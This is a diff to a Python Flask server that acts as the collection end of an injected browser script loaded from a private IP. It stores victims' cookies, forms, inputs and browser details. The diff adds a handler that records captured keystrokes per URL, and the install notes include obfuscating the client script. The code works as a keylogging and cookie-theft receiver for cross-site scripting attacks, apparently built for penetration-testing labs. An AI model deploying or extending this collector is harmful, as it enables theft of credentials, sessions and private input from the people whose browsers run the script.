@@ -1,6 +1,20 @@
+# Installation steps
+# ------------------------------
+#  pip3 install flask
+#  pip3 install flask_cors
+#  pip3 install jsmin
+#  apt install node-uglify
+# 
+# For HTTPS: openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
+# Usage: <script src="https://192.168.119.140:9443/client.js" />
+#  
+# Other installation options:
+#  Download dependeicies: `pip3 download jsmin -d deps`
+#  With PIP but no internet: https://stackoverflow.com/questions/36725843/installing-python-packages-without-internet-and-using-source-code-as-tar-gz-and
+#  No POP no internet: `import sys; print(sys.path)`
 from flask import Flask, request, make_response, send_file
 from db import get_or_insert_extraction, build_content_to_link_relationships
-from db import create_connection, create_db, insert_content, insert_cookie, insert_link, insert_script, insert_form, insert_input, insert_browser
+from db import create_connection, create_db, insert_content, insert_cookie, insert_link, insert_script, insert_form, insert_input, insert_browser, insert_keys
 from flask_cors import CORS
 from jsmin import jsmin
 from urllib.parse import urlparse
@@ -124,6 +138,14 @@ def content():
         conn.commit()
         print("[+] Received browser details for domain: %s" % (domain))
 
+    elif dataType == 'KEYS':
+        if trace:
+            print(jsonData)
+        db_data = (extraction_id, data['url'], data['timestamp'], data['keys'],)
+        insert_keys(conn, db_data)
+        conn.commit()
+        print("[+] Received keys for domain: %s url: %s" % (domain, data['url']))
+
     build_content_to_link_relationships(conn, extraction_id)
 
     response = make_response("")
@@ -135,17 +157,3 @@ def content():
 
 # For HTTPS
 app.run(host='0.0.0.0', port=9444, ssl_context=('cert.pem', 'key.pem'))
-
-
-# Installation steps
-# ------------------------------
-# sudo pip3 install flask_cors
-# sudo apt-get install node-uglify
-# 
-# For HTTPS: 
-#   openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
-# 
-# <script src="https://192.168.119.140:9443/client.js" />
-# 
-# sudo apt install npm
-# sudo npm install --save-dev javascript-obfuscator
